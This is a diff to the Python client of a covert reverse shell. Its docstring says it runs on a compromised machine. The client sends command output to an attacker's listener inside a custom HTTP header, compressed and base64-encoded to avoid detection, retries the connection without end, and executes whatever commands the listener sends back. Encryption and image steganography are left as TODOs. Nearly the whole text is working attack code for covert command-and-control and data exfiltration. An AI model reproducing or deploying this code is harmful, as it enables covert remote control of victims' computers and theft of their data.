@@ -3,13 +3,15 @@ Executes on the compromised machine. A reverse shell that communicates with the 
 '''
 
 import requests
+from requests import Request, Response
+from copy import copy
 import base64
 from math import ceil
 from time import sleep
 import os
 import subprocess
 import zlib
-from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH
+from utils import LISTENER_IP, LISTENER_PORT, STEGO_HEADER_NAME, CLIENT_MAX_MESSAGE_LENGTH, RequestFlags
 
 # Time in seconds to wait for a http response before a timeout occurs.
 # This time should be long, to give user ample time to input their commands into the listener. 
@@ -29,30 +31,75 @@ def get_random_url():
     # For now, just return the root url.
     return LISTENER_ROOT_URL
 
-def compress_and_encode_string(string: str):
+
+def create_requests(data: str):
     '''
+    Send 1 or more requests.
+
     Compresses the given string to reduce size of packets sent (reducing chance of detection). 
     Then, base64 encodes the string such that it can be stored in the HTTP header (HTTP headers don't allow some characters), and also for obfuscation purposes.
     
+    todo: finish docstring
+
     Arguments:
         string (str): String to be compressed and encoded
 
     Returns:
         str: The resultant string
     '''
-    # TODO: if compressed form is LARGER, send uncompressed form, and indicate so
 
-    # If string is empty, no need to compress/encode it.
-    if (len(string) == 0):
-        return ""
+    def encrypt_data(data: str):
+        '''
+        Package data for a single request
+        '''
+        # 1. Encryption
+        # TODO
+        return data.encode()
 
-    # TEMPORARY (prints size of string before and after compression)
-    print(str(len(string.encode('utf-8'))) + " --> " + str(len(zlib.compress(string.encode('utf-8')))))
-    # Compress the string
-    compressed_bytes = zlib.compress(string.encode('utf-8'))
-    # Encode the compressed data using Base64 
-    encoded_string = base64.b64encode(compressed_bytes).decode('utf-8')
-    return encoded_string
+    def compress_data(data: bytes):
+        return zlib.compress(data)
+    
+    def add_request_flags(request: Request, flags: RequestFlags):
+        if RequestFlags.IS_NOT_COMPRESSED in flags:
+            request.headers["IS_NOT_COMPRESSED"] = "1"
+        if RequestFlags.IS_END_OF_MESSAGE in flags:
+            request.headers["IS_END_OF_MESSAGE"] = "1"
+        return
+    
+    # The headers for the request(s) to be sent
+    requests = []
+    default_request = Request(
+        method='GET',
+        headers= {STEGO_HEADER_NAME: ""}
+    )
+
+    # Check if there is no data to send
+    if len(data) == 0:
+        requests.append(copy(default_request))
+        # Return a single request with empty headers
+        return requests
+    
+    request_flags = RequestFlags(0) # Start with no flags set
+    encrypted_data = encrypt_data(data)
+    compressed_data = compress_data(encrypted_data)
+    # If compressing makes data larger, DON'T compress the data
+    if len(compressed_data) > len(encrypted_data):
+        compressed_data = encrypted_data
+        request_flags |= RequestFlags.IS_NOT_COMPRESSED
+
+    encoded_str = base64.b64encode(compressed_data).decode()
+    # Calculate how many requests to split the data into
+    request_count = ceil(len(encoded_str) / CLIENT_MAX_MESSAGE_LENGTH)
+    encoded_str_split = [encoded_str[i:i+CLIENT_MAX_MESSAGE_LENGTH] for i in range(0, len(encoded_str), CLIENT_MAX_MESSAGE_LENGTH)]
+
+    for i in range(request_count):
+        if i == request_count - 1:
+            request_flags |= RequestFlags.IS_END_OF_MESSAGE
+        new_request = copy(default_request)
+        new_request.headers[STEGO_HEADER_NAME] = encoded_str_split[i]
+        add_request_flags(new_request, request_flags)
+        requests.append(new_request)
+    return requests
 
 def send_stego_data_to_listener(data: str):
     '''
@@ -65,37 +112,27 @@ def send_stego_data_to_listener(data: str):
     Returns:
         str: Reply string found within the listener's HTTP response.
     '''
-    compressed_data = compress_and_encode_string(data)
-    # Calculate number of requests needed to send full data
-    request_count = ceil(len(compressed_data) / CLIENT_MAX_MESSAGE_LENGTH)
-    compressed_data_split = [""]
-    if len(compressed_data) != 0:
-        # Create a str list where each element is meant to be sent in one request
-        compressed_data_split = [compressed_data[i:i+request_count] for i in range(0, len(compressed_data), request_count)]
-        # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
-    while (True):
+    # Get the list of request header(s) to send
+    requests_list = create_requests(data)
+    # Keep retrying connection to listener until successful (ensures functioning even if temporarily disconnected)
+    while (True):  
         try:
-            reply = ""
-            for i in range(request_count):
-                if i == request_count - 1:
-                    # Indicates to listener that this is last request.
-                    first_char = "1"
-                else:
-                    # Indicates to listener that this request is not the last.
-                    first_char = "2"
-                # Send the data as part of the HTTP header
-                headers = {
-                    STEGO_HEADER_NAME: first_char + (len(compressed_data_split[i]) % 4) * "=" # Ensure padding such that data (excluding first char) is valid base64
-                }
-                url = get_random_url()
-                # for now, listener reply is simply stored in the response text
-#               TODO: store and retrieve it via image steganoraphy
-                reply = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT).text
-            return reply
+            response = None
+            # Send all request(s)
+            for i in range(len(requests_list)):
+                request = requests_list[i]
+                request.url = get_random_url()
+                with requests.Session() as session:
+                    response = session.send(request.prepare())
+            return response
         except Exception as e:
             print(e)
             sleep(5) # Ensures connection retries aren't sent too frequently
             continue
+
+def get_command_line_input(response: Response):
+    # for now, listener reply is simply stored in the response text TODO: store and retrieve it via image steganoraphy
+    return response.text
 
 def execute_command_line_input(input: str):
     '''
@@ -136,7 +173,8 @@ def main():
         2. Listener sends command-line input to client (http response)
         3. repeat
         '''
-        command_line_input = send_stego_data_to_listener(command_line_output)
+        last_response = send_stego_data_to_listener(command_line_output)
+        command_line_input = get_command_line_input(last_response)
         command_line_output = execute_command_line_input(command_line_input)
 
 if __name__ == '__main__':
